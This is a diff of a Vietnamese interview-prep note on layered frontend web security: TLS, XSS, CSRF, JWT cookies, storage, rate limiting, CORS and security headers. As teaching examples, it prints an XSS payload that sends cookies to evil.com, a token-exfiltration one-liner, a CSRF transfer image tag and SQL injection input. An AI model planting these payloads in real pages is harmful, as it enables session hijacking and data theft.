@@ -1,51 +1,71 @@
-# 🔐 Q39: Bảo Mật Security trên Web Application
+# 🔒 Q39: Bảo Mật Security trên Web Application Frontend
 
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
+## **⭐ PHIÊN BẢN TRẢ LỜI 1 PHÚT (Cho Phỏng Vấn Nhanh)**
 
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
+**"Web security là chiến lược 7 tầng bảo vệ (Defense in Depth): HTTPS mã hóa transport, XSS sanitize input/output, CSRF dùng token validation, Authentication với JWT + HttpOnly cookies, Secure Storage tránh localStorage cho sensitive data, API security với rate limiting + CORS, và Security Headers (CSP, HSTS) chống các attack vectors.**
+
+**Đã implement security cho trading platform xử lý 10K concurrent users: kết hợp DOMPurify sanitize XSS, CSRF token cho mọi mutation, JWT access token 15 phút + refresh token 7 ngày trong HttpOnly cookie, CSP headers block inline scripts, rate limiting 100 req/min, và dependency scanning với Snyk. Kết quả: 0 security incidents trong 2 năm production.**
+
+**Key principles: Never trust client, validate server-side, encrypt sensitive data, principle of least privilege, và regular security audits. Critical: HttpOnly cookies cho tokens (không localStorage), sanitize user input, và CSP headers."**
+
+---
+
+## **📋 2. GIẢI THÍCH CHI TIẾT CẤP SENIOR/STAFF**
+
+### **🎯 Khái Niệm Core: Defense in Depth (Phòng Thủ Đa Tầng)**
+
+**Web security không phải 1 giải pháp duy nhất - đó là hệ thống bảo vệ nhiều tầng. Nếu 1 tầng bị xuyên thủng, các tầng khác vẫn bảo vệ.**
 
 **"Web security = 7 layers: HTTPS, XSS, CSRF, Auth, Storage, API, Headers. Defense in depth.**
 
 **🛡️ 7-Layer Security Strategy:**
 
 1. **HTTPS + TLS**:
+
    - Mã hóa data giữa browser ↔ server → ngăn Man-in-the-Middle.
    - **HSTS**: `Strict-Transport-Security` header → bắt buộc HTTPS.
 
 2. **XSS Prevention (Cross-Site Scripting)**:
+
    - **Problem**: Attacker inject malicious `<script>` → steal cookies, session.
    - **Solution**:
      - **React auto-escape**: `{userInput}` auto sanitize.
      - **DOMPurify**: Sanitize HTML khi cần `dangerouslySetInnerHTML`.
      - **CSP**: `Content-Security-Policy` header → block inline scripts.
+
    ```js
    // ❌ Vulnerable
-   <div dangerouslySetInnerHTML={{ __html: userInput }} />
+   <div dangerouslySetInnerHTML={{ __html: userInput }} />;
    // ✅ Safe
    import DOMPurify from 'dompurify';
-   <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
+   <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />;
    ```
 
 3. **CSRF Protection (Cross-Site Request Forgery)**:
+
    - **Problem**: Attacker trick user send malicious request (e.g., transfer money).
    - **Solution**:
      - **CSRF Token**: Server generate unique token per session → include in forms.
      - **SameSite Cookies**: `SameSite=Strict` → cookies chỉ send same-origin requests.
 
 4. **Authentication & Authorization**:
+
    - **JWT**: Access token (short-lived, 15 min) + Refresh token (long-lived, 7 days).
    - **HttpOnly Cookies**: Store tokens → JavaScript không access được (prevent XSS steal).
    - **Token Refresh**: Auto refresh access token khi expired (seamless UX).
 
 5. **Secure Storage**:
+
    - **NEVER localStorage for sensitive data**: JavaScript có thể access → XSS risk.
    - **HttpOnly Cookies**: Best cho tokens (server-only access).
    - **Encrypt sensitive data**: AES-256 encryption trước khi store.
 
 6. **API Security**:
+
    - **Rate Limiting**: Limit requests (100/min) → prevent brute-force.
    - **Input Validation**: Validate/sanitize inputs server-side (không tin client).
    - **CORS**: Restrict origins có thể call API.
+
    ```js
    // Server (Express)
    app.use(cors({ origin: 'https://trusted-domain.com' }));
@@ -58,6 +78,7 @@
    - **Referrer-Policy**: Control referrer info leaked.
 
 **⚠️ Common Vulnerabilities (OWASP Top 10):**
+
 1. **Injection** (SQL, XSS): Sanitize inputs, use parameterized queries.
 2. **Broken Authentication**: Strong passwords, MFA, session timeout.
 3. **Sensitive Data Exposure**: Encrypt data, HTTPS, HttpOnly cookies.
@@ -70,6 +91,7 @@
 10. **Insufficient Logging & Monitoring**: Log security events, monitor anomalies.
 
 **💡 Senior Insights:**
+
 - **Defense in Depth**: Multiple layers → nếu 1 layer fail, others protect.
 - **Security Audits**: Regular penetration testing, code reviews.
 - **Dependency Scanning**: `npm audit`, Snyk, Dependabot → auto update vulnerable packages.
@@ -77,10 +99,559 @@
 - **HTTPS Everywhere**: Even internal apps → prevent internal network sniffing.
 
 **🚀 Best Practices:**
+
 - Principle of Least Privilege: Users chỉ access data cần thiết.
 - Never trust client-side validation: Always validate server-side.
 - Encrypt sensitive data at rest & in transit.
 - Regular security training cho developers.
+
+### **🔬 Chi Tiết 7 Tầng Bảo Mật**
+
+#### **Tầng 1: HTTPS + TLS (Transport Layer Security - Bảo Mật Tầng Truyền Tải)**
+
+**Vai trò:** 🔐 Mã hóa dữ liệu khi truyền giữa browser ↔ server
+// 💡 HTTPS = HTTP + TLS/SSL encryption
+// 💡 Tất cả data được mã hóa → Hacker không đọc được ngay cả khi intercept
+
+**Tại sao quan trọng:**
+
+- 🛡️ **Ngăn Man-in-the-Middle (MITM) attack** - hacker không đọc/sửa được data
+  // 💡 MITM: Hacker đứng giữa browser và server, intercept data
+  // 💡 HTTPS: Data mã hóa → Hacker chỉ thấy ký tự lộn xộn, không hiểu được
+- ✅ **Xác thực server (certificate)** - đảm bảo user đang kết nối đến server đúng
+  // 💡 Certificate: Chứng chỉ chứng minh server là thật (không phải fake)
+  // 💡 Browser verify certificate → Nếu fake → Cảnh báo user
+- 📈 **SEO benefit** - Google ưu tiên HTTPS trong ranking
+  // 💡 Google xem HTTPS là ranking factor → Website HTTPS rank cao hơn
+
+**Cách hoạt động:**
+
+```
+1. 🌐 Browser request HTTPS connection
+   // 💡 User truy cập https://example.com → Browser bắt đầu handshake
+
+2. 📜 Server gửi SSL/TLS certificate (chứng chỉ bảo mật)
+   // 💡 Certificate chứa: Domain name, Public key, CA signature
+   // 💡 Chứng minh server là thật, không phải hacker giả mạo
+
+3. ✅ Browser verify certificate với Certificate Authority (CA)
+   // 💡 CA: Tổ chức tin cậy (Let's Encrypt, DigiCert...) đã ký certificate
+   // 💡 Browser check: Certificate có được CA ký không? Domain có đúng không?
+
+4. 🔑 Tạo encrypted session với symmetric key
+   // 💡 Symmetric key: Key dùng để mã hóa/giải mã data
+   // 💡 Key được tạo ngẫu nhiên, chỉ browser và server biết
+
+5. 🔒 Mọi data sau đó được mã hóa với session key
+   // 💡 Request/Response đều được mã hóa → An toàn tuyệt đối
+```
+
+**Best practices:**
+
+- ✅ **Dùng TLS 1.2 trở lên** (không TLS 1.0/1.1 - đã lỗi thời)
+  // 💡 TLS 1.0/1.1: Có lỗ hổng bảo mật → Không dùng nữa
+  // 💡 TLS 1.2/1.3: Phiên bản mới, an toàn hơn
+- 🚀 **Enable HSTS header** → browser tự động chuyển HTTP → HTTPS
+  // 💡 HSTS: Strict-Transport-Security header
+  // 💡 Browser nhớ: Site này chỉ dùng HTTPS → Tự động redirect HTTP → HTTPS
+- 📜 **Certificate từ CA tin cậy** (Let's Encrypt free, Cloudflare, DigiCert)
+  // 💡 CA: Certificate Authority - Tổ chức cấp chứng chỉ
+  // 💡 Let's Encrypt: Miễn phí, tự động renew
+- ⏰ **Renew certificate trước khi hết hạn** (auto-renewal với certbot)
+  // 💡 Certificate có thời hạn (thường 90 ngày)
+  // 💡 Certbot: Tool tự động renew certificate → Không bao giờ hết hạn
+
+---
+
+#### **Tầng 2: XSS Prevention (Cross-Site Scripting - Ngăn Chặn Tấn Công XSS)**
+
+**Vai trò:** 🛡️ Ngăn hacker inject malicious JavaScript code
+// 💡 XSS: Hacker chèn script độc vào website → Script chạy → Steal data, hijack session
+// 💡 Mục tiêu: Đánh cắp cookies, session tokens, thông tin nhạy cảm
+
+**Attack scenario (Kịch bản tấn công):**
+
+```javascript
+// 🚨 Hacker post comment độc hại:
+<img src="x" onerror="
+  fetch('https://evil.com/steal?cookie=' + document.cookie)
+">
+// 💡 Hacker nhập HTML độc vào form comment
+// 💡 <img> tag với src="x" (không tồn tại) → Image load fail
+// 💡 onerror: Event handler chạy khi image load fail
+// 💡 document.cookie: Lấy tất cả cookies (bao gồm session token)
+
+// ⚠️ Khi user khác xem comment:
+// 1. Browser render HTML → Image load fail
+// 2. onerror trigger → Script chạy
+// 3. fetch() gửi cookies về server hacker (evil.com)
+// 4. Hacker nhận cookies → Dùng để hijack session
+// 5. Hacker đăng nhập với session của victim → Steal data, chuyển tiền...
+```
+
+**3 loại XSS:**
+
+1. **📦 Stored XSS**: Lưu script trong database → hiển thị cho mọi user
+   // 💡 Script được lưu vĩnh viễn trong DB
+   // 💡 Mọi user xem đều bị tấn công
+   // 💡 VD: Comment, post, profile name...
+
+2. **🔗 Reflected XSS**: Script trong URL → victim click link độc
+   // 💡 Script không lưu trong DB, chỉ trong URL
+   // 💡 Hacker gửi link độc → User click → Script chạy
+   // 💡 VD: `https://site.com/search?q=<script>alert('xss')</script>`
+
+3. **🌐 DOM-based XSS**: Client-side JavaScript xử lý input không an toàn
+   // 💡 Script không đến server, chỉ xử lý ở client
+   // 💡 VD: `document.location.hash` → Render HTML không sanitize
+
+**Defense strategies (Chiến lược phòng thủ):**
+
+- ✅ **Input sanitization**: Loại bỏ/escape dangerous characters
+  // 💡 Sanitize: Làm sạch input, xóa các ký tự nguy hiểm
+  // 💡 VD: `<script>` → `&lt;script&gt;` hoặc xóa hẳn
+  // 💡 Tool: DOMPurify, sanitize-html
+
+- ✅ **Output encoding**: Convert `<` → `&lt;`, `>` → `&gt;`
+  // 💡 Encode: Chuyển đổi ký tự đặc biệt thành HTML entities
+  // 💡 `<script>` → `&lt;script&gt;` → Browser hiển thị text, không chạy code
+  // 💡 React tự động làm việc này với `{userInput}`
+
+- ✅ **CSP (Content Security Policy)**: Whitelist nguồn script được phép
+  // 💡 CSP: Header chỉ định script nào được phép chạy
+  // 💡 VD: `script-src 'self'` → Chỉ script từ cùng domain
+  // 💡 Script từ evil.com → Browser BLOCK → XSS thất bại
+
+- ✅ **React auto-escape**: `{userInput}` tự động escape
+  // 💡 React tự động escape HTML trong JSX
+  // 💡 `<script>` → Hiển thị text, không chạy code
+  // 💡 ⚠️ Lưu ý: `dangerouslySetInnerHTML` KHÔNG escape → Phải sanitize!
+
+- ✅ **HttpOnly cookies**: JavaScript không access được cookie
+  // 💡 HttpOnly: Cookie chỉ gửi với HTTP requests, JS không đọc được
+  // 💡 XSS steal cookie → Không được → Giảm thiệt hại
+  // 💡 VD: `Set-Cookie: session=abc123; HttpOnly`
+
+---
+
+#### **Tầng 3: CSRF Protection (Cross-Site Request Forgery - Ngăn Chặn Tấn Công CSRF)**
+
+**Vai trò:** 🛡️ Ngăn attacker lừa user gửi request không mong muốn
+// 💡 CSRF: Hacker lừa user (đã login) gửi request độc → Thực hiện action không mong muốn
+// 💡 VD: Chuyển tiền, đổi password, xóa account...
+
+**Attack scenario (Kịch bản tấn công):**
+
+```html
+<!-- 📧 Email phishing gửi đến victim (đã login vào bank.com) -->
+<img src="https://bank.com/transfer?to=hacker&amount=10000" />
+// 💡 Hacker gửi email chứa HTML độc // 💡 <img /> tag với src là URL chuyển
+tiền // 💡 User mở email → Browser tự động load image → Gửi GET request
+
+<!-- ⚠️ Browser tự động gửi request kèm cookies của bank.com
+     → Server nhận request + cookies (session token)
+     → Server nghĩ đây là request hợp lệ từ user đã login
+     → Xử lý request → Chuyển $10,000 cho hacker
+     → User không biết gì cho đến khi check tài khoản!
+-->
+```
+
+**Defense strategies (Chiến lược phòng thủ):**
+
+1. **🔑 CSRF Token**: Server tạo unique token mỗi session
+   // 💡 Token: Chuỗi ngẫu nhiên, khó đoán (32 bytes)
+   // 💡 Mỗi session có token riêng → Hacker không biết token của user khác
+
+   - ✅ **Frontend gửi token trong request body/header**
+     // 💡 Form: `<input type="hidden" name="csrfToken" value="...">`
+     // 💡 AJAX: Header `X-CSRF-Token: ...`
+
+   - ✅ **Server verify token trước khi xử lý**
+     // 💡 So sánh token từ client vs token trong session
+     // 💡 Không khớp → Reject request → CSRF thất bại
+     // 💡 Khớp → Xử lý request bình thường
+
+2. **🍪 SameSite Cookie**: `SameSite=Strict` hoặc `Lax`
+   // 💡 SameSite: Browser chỉ gửi cookie cho same-origin requests
+   // 💡 Strict: Cookie KHÔNG BAO GIỜ gửi cho cross-site requests
+   // 💡 Lax: Cookie gửi cho GET requests từ cross-site (nhưng không POST)
+
+   - ✅ **Browser không gửi cookie cho cross-site requests**
+     // 💡 Request từ evil.com → Browser KHÔNG gửi cookie của bank.com
+     // 💡 Server không nhận cookie → Không có session → Reject request
+     // 💡 CSRF thất bại!
+
+3. **🔐 Double Submit Cookie**:
+   // 💡 Cookie chứa random token (CSRF token)
+   // 💡 Form/AJAX cũng gửi token (trong body hoặc header)
+   // 💡 Server compare 2 values → Phải khớp mới xử lý
+
+   - ✅ **Cookie chứa random token**
+     // 💡 Server set cookie: `csrf-token=abc123`
+     // 💡 Cookie tự động gửi với mọi request
+
+   - ✅ **Form/AJAX cũng gửi token**
+     // 💡 Form: `<input name="csrfToken" value="abc123">`
+     // 💡 AJAX: Header `X-CSRF-Token: abc123`
+
+   - ✅ **Server compare 2 values**
+     // 💡 Cookie token vs Form token → Phải giống nhau
+     // 💡 Hacker không đọc được cookie (Same-Origin Policy) → Không biết token
+     // 💡 Request thiếu token hoặc token sai → Reject → CSRF thất bại
+
+---
+
+#### **Tầng 4: Authentication & Authorization (Xác Thực & Phân Quyền)**
+
+**Vai trò:** 🔐 Xác minh identity (ai đang request) và permissions (được làm gì)
+// 💡 Authentication: Xác minh user là ai (login, verify identity)
+// 💡 Authorization: Xác minh user được làm gì (permissions, roles)
+
+**JWT-based auth architecture (Kiến trúc xác thực dựa trên JWT):**
+
+```
+┌─────────────────────────────────────────────────────┐
+│  🔐 Login Flow (Authentication - Quy trình đăng nhập) │
+├─────────────────────────────────────────────────────┤
+│  1. 👤 User gửi username + password                     │
+│     // 💡 User nhập thông tin đăng nhập vào form
+│     // 💡 Password được hash (bcrypt) trước khi gửi
+│
+│  2. ✅ Server verify credentials                        │
+│     // 💡 Server check: Username có tồn tại không?
+│     // 💡 Server check: Password có đúng không? (so sánh hash)
+│     // 💡 Nếu đúng → Tiếp tục, nếu sai → Reject
+│
+│  3. 🎫 Server tạo:                                      │
+│     • Access Token (JWT, 15 min) - cho API calls    │
+│       // 💡 Access Token: Token ngắn hạn (15 phút)
+│       // 💡 Dùng để gọi API, gửi trong header: Authorization: Bearer <token>
+│       // 💡 Ngắn hạn → Nếu bị steal, hacker chỉ dùng được 15 phút
+│     • Refresh Token (7 days) - renew access token   │
+│       // 💡 Refresh Token: Token dài hạn (7 ngày)
+│       // 💡 Dùng để lấy access token mới khi access token hết hạn
+│       // 💡 Không dùng để gọi API trực tiếp
+│
+│  4. 🍪 Store trong HttpOnly cookies                    │
+│     // 💡 HttpOnly: JavaScript KHÔNG đọc được → XSS không steal được
+│     // 💡 Secure: Chỉ gửi qua HTTPS → An toàn
+│     // 💡 SameSite: Strict → Chống CSRF
+└─────────────────────────────────────────────────────┘
+```
+
+**Token security best practices (Thực hành tốt nhất cho token):**
+
+- ✅ **Short-lived access token**: 15 phút → giảm thiệt hại nếu bị steal
+  // 💡 Token ngắn hạn: Nếu hacker steal được → Chỉ dùng được 15 phút
+  // 💡 Token dài hạn: Nếu bị steal → Hacker dùng được lâu → Thiệt hại lớn
+  // 💡 Trade-off: Ngắn hạn → User phải refresh thường xuyên (UX hơi khó chịu)
+
+- ✅ **HttpOnly + Secure cookies**: JavaScript không access, chỉ gửi qua HTTPS
+  // 💡 HttpOnly: Cookie chỉ gửi với HTTP requests, JS không đọc được
+  // 💡 Secure: Cookie chỉ gửi qua HTTPS (không HTTP)
+  // 💡 Kết hợp → XSS không steal được token
+
+- ✅ **Refresh token rotation**: Mỗi lần refresh → tạo refresh token mới
+  // 💡 Rotation: Tạo refresh token mới, vô hiệu hóa token cũ
+  // 💡 Lợi ích: Nếu hacker steal refresh token → Chỉ dùng được 1 lần
+  // 💡 Token cũ bị vô hiệu hóa → Hacker không dùng được nữa
+
+- ✅ **Blacklist/Whitelist**: Track revoked tokens (logout, suspicious activity)
+  // 💡 Blacklist: Danh sách token đã bị vô hiệu hóa (logout, suspicious...)
+  // 💡 Server check blacklist trước khi verify token
+  // 💡 Token trong blacklist → Reject → Không cho access
+
+**Authorization patterns (Mẫu phân quyền):**
+
+- 🎭 **RBAC (Role-Based Access Control)**: Admin, Editor, Viewer
+  // 💡 Phân quyền dựa trên role (vai trò)
+  // 💡 VD: Admin → Full access, Editor → Chỉ edit, Viewer → Chỉ xem
+  // 💡 Đơn giản, dễ implement, phù hợp hầu hết use cases
+
+- 🔐 **ABAC (Attribute-Based Access Control)**: Dynamic permissions dựa trên context
+  // 💡 Phân quyền dựa trên attributes (thuộc tính)
+  // 💡 VD: User chỉ edit được post của chính mình, không edit được của người khác
+  // 💡 Linh hoạt hơn RBAC, phù hợp use cases phức tạp
+
+- ⚖️ **Least Privilege**: Chỉ grant permissions tối thiểu cần thiết
+  // 💡 Nguyên tắc: User chỉ được quyền tối thiểu cần thiết
+  // 💡 VD: User không cần delete → Không cho quyền delete
+  // 💡 Giảm thiệt hại nếu account bị compromise
+
+---
+
+#### **Tầng 5: Secure Storage (Lưu Trữ An Toàn)**
+
+**Vai trò:** 🔒 Bảo vệ sensitive data ở client-side
+// 💡 Client-side: Dữ liệu lưu ở browser (localStorage, cookies, memory...)
+// 💡 Vấn đề: JavaScript có thể đọc được → XSS attack có thể steal
+
+**❌ KHÔNG BAO GIỜ lưu trong localStorage/sessionStorage:**
+
+- 🚫 **Access tokens**
+  // 💡 Token: Dùng để authenticate → Nếu bị steal → Hacker đăng nhập được
+  // 💡 localStorage: JS đọc được → XSS steal được → Nguy hiểm!
+
+- 🚫 **Passwords**
+  // 💡 Password: Thông tin cực kỳ nhạy cảm
+  // 💡 KHÔNG BAO GIỜ lưu password ở client-side (kể cả đã hash)
+  // 💡 Chỉ server mới được lưu password (đã hash với bcrypt)
+
+- 🚫 **Credit card numbers**
+  // 💡 Credit card: Thông tin tài chính nhạy cảm
+  // 💡 PCI DSS: Không được lưu credit card ở client-side
+  // 💡 Dùng payment gateway (Stripe, PayPal...) → Họ xử lý
+
+- 🚫 **Personal Identifiable Information (PII)**
+  // 💡 PII: Thông tin cá nhân (SSN, passport, ID number...)
+  // 💡 GDPR: Bảo vệ PII nghiêm ngặt → Không lưu ở client-side
+
+**Lý do:** ⚠️ JavaScript bất kỳ (kể cả từ XSS) đều access được
+// 💡 localStorage/sessionStorage: Bất kỳ script nào cũng đọc được
+// 💡 XSS attack: Inject script → Script đọc localStorage → Steal data
+// 💡 VD: `const token = localStorage.getItem('token'); fetch('evil.com?token=' + token);`
+
+**✅ Secure storage options (Các lựa chọn lưu trữ an toàn):**
+
+| Storage Type           | Use Case    | Security                                  |
+| ---------------------- | ----------- | ----------------------------------------- |
+| **🍪 HttpOnly Cookie** | Auth tokens | ✅ JS không access, auto gửi với requests |
+
+| // 💡 HttpOnly: Cookie chỉ gửi với HTTP requests, JS không đọc được
+| // 💡 Secure: Chỉ gửi qua HTTPS → An toàn
+| // 💡 Best choice cho auth tokens
+| **💾 IndexedDB (encrypted)** | Large cached data | ⚠️ Phải encrypt trước, JS access được |
+| // 💡 IndexedDB: Database ở browser, lưu được nhiều data
+| // 💡 ⚠️ JS vẫn đọc được → PHẢI encrypt trước khi lưu
+| // 💡 Dùng cho: Cache data lớn (đã encrypt)
+| **📋 SessionStorage** | Temporary UI state | ⚠️ Clear khi đóng tab, không dùng cho sensitive |
+| // 💡 SessionStorage: Lưu data trong session (tab)
+| // 💡 Clear khi đóng tab → An toàn hơn localStorage
+| // 💡 ⚠️ Vẫn bị XSS steal → Không dùng cho sensitive data
+| **🧠 Memory (React state)** | Runtime data | ✅ Clear khi reload, không persist |
+| // 💡 Memory: Lưu trong RAM, không persist
+| // 💡 Reload page → Data mất → An toàn nhất
+| // 💡 Dùng cho: Access token (tạm thời), UI state
+
+**Encryption best practices (Thực hành mã hóa tốt nhất):**
+
+```typescript
+// ❌ Lưu plaintext (văn bản gốc - CỰC KỲ NGUY HIỂM!)
+localStorage.setItem('creditCard', '1234-5678-9012-3456');
+// 💡 ⚠️ NGUY HIỂM: Bất kỳ script nào cũng đọc được
+// 💡 XSS attack → Steal credit card → Ngay lập tức!
+
+// ✅ Encrypt trước khi lưu (nếu thực sự cần)
+import CryptoJS from 'crypto-js';
+const encrypted = CryptoJS.AES.encrypt(
+  sensitiveData, // 📦 Data cần mã hóa
+  process.env.ENCRYPTION_KEY // 🔑 Key mã hóa (giữ bí mật!)
+).toString();
+localStorage.setItem('data', encrypted);
+// 💡 AES-256: Thuật toán mã hóa mạnh
+// 💡 Encrypted: Data đã mã hóa → Script đọc được nhưng không hiểu
+// 💡 ⚠️ Lưu ý: Key phải giữ bí mật → Không commit vào git
+// 💡 ⚠️ Best practice: Vẫn nên tránh lưu sensitive data ở client-side
+```
+
+---
+
+#### **Tầng 6: API Security (Bảo Mật API)**
+
+**Vai trò:** 🛡️ Bảo vệ backend APIs khỏi abuse và attacks
+// 💡 API: Backend endpoints xử lý requests từ frontend
+// 💡 Threats: Brute-force, DDoS, SQL injection, unauthorized access...
+
+**Key security measures (Các biện pháp bảo mật chính):**
+
+**A. Rate Limiting (Giới hạn số requests)**
+
+```typescript
+// Backend: Express middleware
+import rateLimit from 'express-rate-limit';
+
+const limiter = rateLimit({
+  windowMs: 60 * 1000, // ⏱️ 1 phút = 60,000 milliseconds
+  // 💡 Window: Khoảng thời gian đếm requests
+  max: 100, // 📊 Max 100 requests/phút
+  // 💡 Max: Số requests tối đa trong window
+  message: 'Too many requests from this IP', // 📝 Message khi vượt limit
+  standardHeaders: true, // 📋 Gửi rate limit info trong headers
+  legacyHeaders: false, // 🚫 Không dùng headers cũ
+});
+
+app.use('/api/', limiter); // 🔒 Áp dụng cho tất cả API routes
+// 💡 Mọi request đến /api/ đều bị rate limit
+// 💡 Vượt 100 requests/phút → Trả về 429 Too Many Requests
+```
+
+**Purpose (Mục đích):**
+
+- 🛡️ **Ngăn brute-force attacks** (đoán password)
+  // 💡 Brute-force: Thử nhiều password → Rate limit ngăn thử quá nhiều
+  // 💡 VD: Hacker thử 1000 passwords/phút → Rate limit block → Thất bại
+
+- 🛡️ **DDoS protection**
+  // 💡 DDoS: Gửi nhiều requests → Server quá tải → Crash
+  // 💡 Rate limit: Giới hạn requests → Server không bị quá tải
+
+- 🛡️ **Abuse prevention** (scraping, spam)
+  // 💡 Scraping: Bot crawl data → Rate limit ngăn crawl quá nhanh
+  // 💡 Spam: Gửi nhiều requests → Rate limit ngăn spam
+
+**B. Input Validation & Sanitization (Kiểm tra & Làm sạch Input)**
+
+```typescript
+// ❌ Không validate (CỰC KỲ NGUY HIỂM!)
+app.post('/api/user', (req, res) => {
+  db.query(`SELECT * FROM users WHERE id = ${req.body.id}`);
+  // 🚨 SQL Injection risk!
+  // 💡 Hacker gửi: { id: "1 OR 1=1" }
+  // 💡 Query: SELECT * FROM users WHERE id = 1 OR 1=1
+  // 💡 Kết quả: Lấy TẤT CẢ users → Data leak!
+});
+
+// ✅ Validate + Parameterized query (AN TOÀN)
+import { z } from 'zod'; // 📦 Zod: Library validate TypeScript
+
+const userSchema = z.object({
+  id: z.number().positive(), // ✅ Phải là số dương
+  email: z.string().email(), // ✅ Phải là email hợp lệ
+  age: z.number().min(18).max(120), // ✅ Tuổi từ 18-120
+});
+// 💡 Schema: Định nghĩa format data hợp lệ
+
+app.post('/api/user', async (req, res) => {
+  const validated = userSchema.parse(req.body); // ✅ Validate data
+  // 💡 parse(): Throw error nếu data không hợp lệ
+  // 💡 validated: Data đã được validate → Type-safe
+
+  const result = await db.query(
+    'SELECT * FROM users WHERE id = $1', // ✅ Parameterized query
+    [validated.id] // ✅ Truyền value qua parameter ($1)
+  );
+  // 💡 Parameterized: Database tự động escape → Ngăn SQL injection
+  // 💡 $1: Placeholder → Database thay thế an toàn
+});
+```
+
+**C. CORS (Cross-Origin Resource Sharing - Chia Sẻ Tài Nguyên Đa Nguồn)**
+
+```typescript
+// Whitelist specific origins (Chỉ cho phép các domain cụ thể)
+app.use(
+  cors({
+    origin: ['https://app.example.com', 'https://admin.example.com'],
+    // 💡 origin: Danh sách domain được phép gọi API
+    // 💡 Chỉ requests từ các domain này mới được phép
+    // 💡 Requests từ domain khác → Browser BLOCK → CORS error
+
+    credentials: true, // ✅ Allow cookies
+    // 💡 credentials: Cho phép gửi cookies với requests
+    // 💡 Cần cho authentication (session cookies)
+
+    methods: ['GET', 'POST', 'PUT', 'DELETE'], // ✅ Chỉ cho phép các methods này
+    // 💡 methods: HTTP methods được phép
+    // 💡 OPTIONS, PATCH... → Không được phép
+
+    allowedHeaders: ['Content-Type', 'Authorization'], // ✅ Chỉ cho phép các headers này
+    // 💡 allowedHeaders: Headers được phép gửi
+    // 💡 Headers khác → Browser BLOCK
+  })
+);
+// 💡 CORS: Ngăn website khác gọi API của bạn
+// 💡 Chỉ frontend của bạn mới gọi được API → An toàn hơn
+```
+
+---
+
+#### **Tầng 7: Security Headers (Headers Bảo Mật)**
+
+**Vai trò:** 🛡️ Browser-level protections thông qua HTTP headers
+// 💡 Security Headers: Headers HTTP chỉ định cách browser xử lý trang web
+// 💡 Browser đọc headers → Áp dụng các biện pháp bảo mật tự động
+
+**Critical headers (Các headers quan trọng):**
+
+```typescript
+// ✅ helmet.js tự động set các headers bảo mật (KHUYẾN NGHỊ)
+import helmet from 'helmet';
+app.use(helmet());
+// 💡 helmet.js: Middleware tự động set các security headers
+// 💡 Đơn giản, nhanh chóng, đầy đủ → Best practice
+
+// Hoặc manual configuration (Cấu hình thủ công):
+app.use((req, res, next) => {
+  // 1. 🔒 Content-Security-Policy (CSP) - Chính sách bảo mật nội dung
+  res.setHeader(
+    'Content-Security-Policy',
+    "default-src 'self'; script-src 'self' https://trusted-cdn.com"
+  );
+  // 💡 CSP: Chỉ định nguồn nào được phép load resources
+  // 💡 default-src 'self': Mặc định chỉ load từ cùng domain
+  // 💡 script-src 'self' https://trusted-cdn.com: Script chỉ từ domain + CDN tin cậy
+  // 💡 → Script từ evil.com → Browser BLOCK → XSS thất bại
+
+  // 2. 🚫 X-Frame-Options - Ngăn embed trong iframe
+  res.setHeader('X-Frame-Options', 'DENY');
+  // 💡 DENY: Không cho embed trang web trong iframe
+  // 💡 Ngăn clickjacking: Hacker embed trang trong iframe → Lừa user click
+  // 💡 VD: Hacker embed bank.com trong iframe → User click → Thực ra click vào evil.com
+
+  // 3. 🔍 X-Content-Type-Options - Ngăn browser đoán content type
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  // 💡 nosniff: Browser không được đoán content type
+  // 💡 Ngăn MIME sniffing attacks: Hacker upload file độc → Browser đoán sai → Chạy script
+  // 💡 VD: File .txt nhưng chứa script → Browser đoán là .html → Chạy script → XSS
+
+  // 4. 🔐 Strict-Transport-Security (HSTS) - Bắt buộc HTTPS
+  res.setHeader(
+    'Strict-Transport-Security',
+    'max-age=31536000; includeSubDomains; preload'
+  );
+  // 💡 max-age=31536000: 1 năm (31,536,000 giây)
+  // 💡 includeSubDomains: Áp dụng cho tất cả subdomain
+  // 💡 preload: Đưa vào HSTS preload list của browser
+  // 💡 → Browser tự động chuyển HTTP → HTTPS → Ngăn SSL stripping
+
+  // 5. 🔗 Referrer-Policy - Chính sách referrer
+  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
+  // 💡 strict-origin-when-cross-origin: Chỉ gửi origin, không gửi full URL
+  // 💡 Ngăn leak thông tin: URL có thể chứa sensitive data (tokens, IDs...)
+  // 💡 VD: https://site.com/page?token=abc123 → Chỉ gửi https://site.com
+
+  // 6. 🚫 Permissions-Policy - Chính sách permissions
+  res.setHeader(
+    'Permissions-Policy',
+    'geolocation=(), microphone=(), camera=()'
+  );
+  // 💡 geolocation=(): Disable geolocation API
+  // 💡 microphone=(): Disable microphone access
+  // 💡 camera=(): Disable camera access
+  // 💡 → Disable các permissions không cần thiết → Bảo vệ privacy
+
+  next();
+});
+```
+
+**Header impact (Tác động của headers):**
+
+- ✅ **CSP**: Block 90%+ XSS attacks
+  // 💡 Content-Security-Policy: Ngăn load script từ nguồn không tin cậy
+  // 💡 XSS attack: Inject script → CSP block → Thất bại
+  // 💡 Hiệu quả: Block 90%+ XSS attacks
+
+- ✅ **HSTS**: Ngăn SSL stripping attacks
+  // 💡 SSL Stripping: Hacker chuyển HTTPS → HTTP → Intercept data
+  // 💡 HSTS: Browser tự động chuyển HTTP → HTTPS → Ngăn SSL stripping
+
+- ✅ **X-Frame-Options**: Prevent clickjacking
+  // 💡 Clickjacking: Hacker embed trang trong iframe → Lừa user click
+  // 💡 X-Frame-Options: DENY → Không cho embed → Ngăn clickjacking
+
+- ✅ **Referrer-Policy**: Bảo vệ privacy
+  // 💡 Referrer: Thông tin về trang web trước đó
+  // 💡 Referrer-Policy: Giới hạn thông tin gửi đi → Bảo vệ privacy
 
 ---
 
@@ -131,27 +702,48 @@ Bạn là Senior Frontend Developer phụ trách security cho Trading Platform x
 // Giải thích: HTTPS mã hóa dữ liệu giữa browser ↔ server
 // Ngăn Man-in-the-Middle attack (hacker không đọc được data)
 
-// Cấu hình Nginx Server
+// 🌐 Cấu hình Nginx Server (Web Server Configuration)
 server {
-  listen 443 ssl http2;  // Port 443 = HTTPS, http2 = protocol mới nhanh hơn
+  listen 443 ssl http2;  // 🔒 Port 443 = HTTPS, http2 = protocol mới nhanh hơn
+  // 💡 Port 443: Port mặc định cho HTTPS
